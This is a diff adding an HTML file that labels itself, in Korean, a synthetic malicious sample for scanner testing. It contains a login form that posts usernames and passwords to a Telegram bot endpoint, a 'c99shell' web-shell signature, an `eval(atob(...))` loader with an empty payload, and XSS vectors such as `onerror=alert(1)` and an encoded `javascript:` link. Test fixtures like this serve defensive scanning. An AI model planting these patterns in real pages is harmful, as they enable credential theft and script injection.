@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html><head><title>합성 악성 샘플 (테스트 전용)</title></head>
+<body>
+<h1>이 파일은 스캐너 테스트용 합성 샘플이다. 실제 악성코드가 아니다.</h1>
+
+<form action="https://api.telegram.org/bot123/sendMessage" method="post">
+  <input type="text" name="id">
+  <input type="password" name="pw">
+</form>
+
+<script>
+  // 웹셸 시그니처 (문자열만, 동작 없음)
+  var marker = "c99shell";
+</script>
+
+<script>
+  var payload = "…";
+  eval(atob(payload));
+</script>
+
+<script><!--<script></script><img src=x onerror=alert(1)>//--></script>
+
+<a href="&#106;avascript:alert(1)">클릭</a>
+</body></html>
